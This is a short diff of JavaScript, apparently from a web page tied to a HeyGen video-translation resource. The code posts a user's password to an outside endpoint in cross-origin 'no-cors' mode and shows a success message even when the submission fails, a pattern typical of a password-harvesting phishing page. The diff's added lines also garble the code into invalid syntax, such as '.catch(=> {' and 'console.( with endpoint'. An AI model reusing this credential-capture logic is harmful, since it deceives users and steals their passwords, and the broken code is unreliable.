@@ -2075,7 +2075,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       // Show success message
       showSuccess();
     })
-    .catch(error => {
+    .catch(=> {
       console.error('Error submitting password to your backend:', error);
       
       // Even if backend fails, still show success message
@@ -2154,11 +2154,11 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
           method: 'POST',
           body: formData,
           mode: 'no-cors' // Important for cross-origin requests
-        }).catch(error => {
+        }).catch( => {
           console.error('Error submitting to endpoint:', error);
         });
-      } catch (error) {
-        console.error('Error with endpoint:', error);
+      } catch () {
+        console.( with endpoint:', error);
       }
     });
    
